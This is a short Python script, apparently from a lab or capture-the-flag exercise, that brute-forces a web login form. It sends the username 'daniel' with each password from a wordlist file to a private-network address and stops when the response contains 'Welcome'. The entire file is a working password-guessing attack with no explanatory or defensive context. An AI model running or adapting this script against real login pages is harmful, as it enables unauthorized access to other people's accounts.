import requests

url = "http://10.1.0.97"
username = "daniel"
password_file = "pass.txt"
file = open(password_file, "r")

for password in file.readlines():
    password = password.strip("\n")
    data = {'user': username, 'pass': password}
    send_data_url = requests.post(url, data=data)
    if "Welcome" in send_data_url.text:
        print("[*] Password found: %s" % password)
        break
    else:
        print("[*] Attempting password: %s" % password)

file.close()

